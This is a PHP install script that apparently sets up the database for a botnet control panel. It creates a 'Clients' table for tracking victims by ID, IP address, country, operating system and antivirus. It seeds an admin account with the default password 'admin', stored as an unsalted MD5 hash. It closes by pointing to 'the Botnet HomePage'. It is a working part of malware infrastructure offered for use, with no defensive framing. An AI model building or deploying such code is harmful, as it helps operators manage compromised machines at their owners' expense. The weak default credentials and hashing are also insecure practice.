<!DOCTYPE html>
<html>
<head>
	<title>Database Structure</title>
</head>
<body>
<?php
include 'config.php';

$table = "Clients";
if(mysqli_num_rows(mysqli_query($conn,"SHOW TABLES LIKE '".$table."'")) == 1)  {


} else {

$CreateClients = "CREATE TABLE Clients (id INT(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
VicID MEDIUMTEXT NOT NULL,
IPAdress LONGTEXT NOT NULL,
Contery LONGTEXT NOT NULL,
OS LONGTEXT NOT NULL,
AntiVirus LONGTEXT NOT NULL,
Status LONGTEXT NOT NULL)";
$quriy = mysqli_query($conn, $CreateClients);
echo '<b>Create Clients Table   [ id,VicID,IPAdress,Contery,OS,AntiVirus,Status ]</b><br>';
}

$table2 = "admin";
if(mysqli_num_rows(mysqli_query($conn,"SHOW TABLES LIKE '".$table2."'")) == 1)  {


} else {

$getclients = "SELECT * FROM Clients";
$printclients = mysqli_query($conn,$getclients);

$CreateAdmin = "CREATE TABLE admin (id INT(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
username MEDIUMTEXT NOT NULL,
password LONGTEXT NOT NULL,
role LONGTEXT NOT NULL)";

$quriy2 = mysqli_query($conn, $CreateAdmin);
echo '<b>Create admin Table     [ id,username,password,role ]</b><br>';

$username = "admin";
$password = md5("admin");
$role = 'administrator';
$RegesterUser = "INSERT INTO admin (username,password,role) VALUES ('$username','$password','$role')";

$quriy3 = mysqli_query($conn, $RegesterUser);
echo '<b>Regester Dafualt User  [ 1,admin,admin,administrator]</b><br>';
}
echo '<b>Now You Can Access The Botnet HomePage and Regester a new Account</b>';
mysqli_close($conn);
?> 
</body>
</html>
